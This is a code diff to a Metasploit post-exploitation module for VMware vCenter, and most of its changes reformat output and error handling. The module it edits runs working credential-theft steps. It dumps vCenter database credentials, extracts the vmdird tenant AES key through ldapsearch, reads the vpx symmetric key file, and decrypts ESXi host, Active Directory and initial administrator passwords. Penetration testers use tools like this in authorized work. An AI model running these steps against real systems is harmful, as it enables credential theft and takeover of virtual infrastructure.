@@ -72,14 +72,12 @@ class MetasploitModule < Msf::Post
     print_status('Extracting PostgreSQL database credentials ...')
     get_db_creds
 
-    if @vc_sym_key
-      enum_vpxuser_creds
-    end
+    print_status('Extract ESXi host vpxuser credentials ...')
+    enum_vpxuser_creds
 
     if datastore['DUMP_VMDIR']
       print_status('Extracting vSphere SSO domain secrets ...')
       vmdir_dump
-
     end
 
     if datastore['DUMP_VMAFD']
@@ -369,15 +367,15 @@ class MetasploitModule < Msf::Post
       store_valid_credential(user: sso_user, private: sso_pass, service_data: extra_service_data)
       print_status('Found SSO Identity Source Credential:')
       print_good("#{sso_prov_type} @ #{sso_conn_str}:")
-      print_good("SSOUSER: #{sso_user}")
-      print_good("SSOPASS: #{sso_pass}")
-      print_good("SSODOMAIN: #{sso_domain}")
+      print_good("\t  SSOUSER: #{sso_user}")
+      print_good("\t  SSOPASS: #{sso_pass}")
+      print_good("\tSSODOMAIN: #{sso_domain}")
     end
   end
 
   def get_aes_keys
     # https://github.com/vmware/lightwave/blob/master/vmidentity/install/src/main/java/com/vmware/identity/installer/SystemDomainAdminUpdateUtils.java#L72-L78
-    print_status('Extract vmdird tenant AES encryption keys ...')
+    print_status('Extract vmdird tenant AES encryption key ...')
     shell_cmd = "/opt/likewise/bin/ldapsearch -h localhost -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w #{@shell_bind_pw} \"(objectClass=vmwSTSTenant)\" vmwSTSTenantKey"
     tenant_key = cmd_exec(shell_cmd).split("\n").last
 
@@ -385,7 +383,12 @@ class MetasploitModule < Msf::Post
       fail_with(Msf::Exploit::Failure::Unknown, 'Error extracting tenant AES encryption key')
     end
 
-    tenant_aes_key = tenant_key.split('vmwSTSTenantKey: ').last.encode('iso-8859-1')
+    if tenant_key.include? 'vmwSTSTenantKey:: '
+      tenant_aes_key = tenant_key.split('vmwSTSTenantKey:: ').last.encode('iso-8859-1')
+    else
+      tenant_aes_key = tenant_key.split('vmwSTSTenantKey: ').last.encode('iso-8859-1')
+    end
+
     case tenant_aes_key.length
     when 16
       @vc_tenant_aes_key = tenant_aes_key
@@ -399,7 +402,7 @@ class MetasploitModule < Msf::Post
       fail_with(Msf::Exploit::Failure::Unknown, "Invalid tenant AES encryption key size - expecting 16 raw bytes or 24 Base64 bytes, got #{tenant_aes_key.length}")
     end
 
-    print_good("vSphere Tenant AES encryption key: #{tenant_aes_key} hex: #{@vc_tenant_aes_key_hex}")
+    print_good("vSphere Tenant AES encryption\n\tKEY: #{tenant_aes_key}\n\tHEX: #{@vc_tenant_aes_key_hex}")
 
     extra_service_data = {
       address: Rex::Socket.getaddress(rhost),
@@ -417,18 +420,17 @@ class MetasploitModule < Msf::Post
 
     print_status('Extract vmware-vpx AES key ...')
     unless file_exist?('/etc/vmware-vpx/ssl/symkey.dat')
-      print_error('Could not locate /etc/vmware-vpx/ssl/symkey.dat, vpxuser credential decryption will not be possible')
-      return
+      fail_with(Msf::Exploit::Failure::Unknown, 'Could not locate /etc/vmware-vpx/ssl/symkey.dat')
     end
 
     sym_key = cmd_exec('cat /etc/vmware-vpx/ssl/symkey.dat')
     @vc_sym_key = sym_key.scan(/../).map(&:hex).pack('C*')
-    print_good("vmware-vpx AES encryption key hex: #{sym_key}")
+    print_good("vSphere vmware-vpx AES encryption\n\tHEX: #{sym_key}")
 
     extra_service_data = {
       address: Rex::Socket.getaddress(rhost),
-      port: 389,
-      service_name: 'ldap',
+      port: 5432,
+      service_name: 'psql',
       protocol: 'tcp',
       workspace_id: myworkspace_id,
       module_fullname: fullname,
@@ -639,7 +641,7 @@ class MetasploitModule < Msf::Post
           next
         end
         print_status("Initial administrator account password found for vpx_customization_spec '#{spec}':")
-        print_good("Built-in administrator PW: #{secret_plaintext}")
+        print_good("\tInitial Admin PW: #{secret_plaintext}")
 
         extra_service_data = {
           address: Rex::Socket.getaddress(rhost),
@@ -680,11 +682,11 @@ class MetasploitModule < Msf::Post
 
       case domain_base.include?('.')
       when true
-        print_good("AD User: #{domain_user}@#{domain_base}")
+        print_good("\tAD User: #{domain_user}@#{domain_base}")
       when false
-        print_good("AD User: #{domain_base}\\#{domain_user}")
+        print_good("\tAD User: #{domain_base}\\#{domain_user}")
       end
-      print_good("AD Pass: #{secret_plaintext}")
+      print_good("\tAD Pass: #{secret_plaintext}")
 
       extra_service_data = {
         address: Rex::Socket.getaddress(rhost),
@@ -703,22 +705,25 @@ class MetasploitModule < Msf::Post
   end
 
   def enum_vpxuser_creds
-    print_status('Extract ESXi host vpxuser credentials ...')
     shell_cmd = "export PGPASSWORD=#{@shell_vcdb_pass}; /opt/vmware/vpostgres/current/bin/psql -h 'localhost' -U '#{@vcdb_user}' -d '#{@vcdb_name}' -c 'SELECT dns_name, ip_address, user_name, password FROM vc.vpx_host;' -P pager -A -t"
     vpxuser_rows = cmd_exec(shell_cmd).split("\n")
 
-    unless vpxuser_rows
+    unless vpxuser_rows.first
       print_warning('No ESXi hosts attached to this vCenter system')
       return
     end
 
     vpxuser_rows.each do |vpxuser_row|
-      esxi_fqdn = vpxuser_row.split('|')[0]
-      esxi_ipv4 = vpxuser_row.split('|')[1]
-      esxi_user = vpxuser_row.split('|')[2]
-      vpxuser_secret_b64 = vpxuser_row.split('|')[3].gsub('*', '')
+      row_data = vpxuser_row.split('|')
+      esxi_fqdn = row_data[0]
+      esxi_ipv4 = row_data[1]
+      esxi_user = row_data[2]
+
+      vpxuser_secret_b64 = row_data[3].gsub('*', '')
       esxi_pass = vpx_aes_decrypt(vpxuser_secret_b64)
-      print_good("ESXi Host #{esxi_fqdn} [#{esxi_ipv4}] #{esxi_user} PW: #{esxi_pass}")
+
+      print_good("ESXi Host #{esxi_fqdn} [#{esxi_ipv4}]\t LOGIN: #{esxi_user} PASS: #{esxi_pass}")
+
       extra_service_data = {
         address: esxi_ipv4,
         port: 22,
@@ -750,7 +755,10 @@ class MetasploitModule < Msf::Post
     @vcdb_pass = cmd_exec(shell_cmd)
 
     @shell_vcdb_pass = "'#{@vcdb_pass.gsub("'") { "\\'" }}'"
-    print_good("VCDB Name: #{@vcdb_name} User: #{@vcdb_user} PW: #{@vcdb_pass}")
+
+    print_good("\tVCDB Name: #{@vcdb_name}")
+    print_good("\tVCDB User: #{@vcdb_user}")
+    print_good("\tVCDB Pass: #{@vcdb_pass}")
 
     extra_service_data = {
       address: Rex::Socket.getaddress(rhost),
